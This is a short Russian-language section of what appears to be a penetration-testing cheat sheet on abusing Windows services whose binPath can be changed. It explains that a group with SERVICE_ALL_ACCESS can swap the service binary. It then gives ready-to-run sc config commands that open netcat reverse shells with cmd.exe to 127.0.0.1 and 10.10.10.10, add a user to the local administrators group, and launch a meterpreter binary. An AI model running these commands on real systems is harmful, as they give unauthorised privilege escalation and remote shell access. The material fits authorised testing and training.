##  **Изменить binPath службы**

Если группа «Прошедшие проверку» имеет **SERVICE_ALL_ACCESS** в службе, она может изменить двоичный файл, который выполняется службой. Чтобы изменить его и выполнить **nc** , вы можете сделать:

```
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"

sc config <Service_Name> binpath= "net localgroup administrators username /add"

sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"

sc start newservicename
```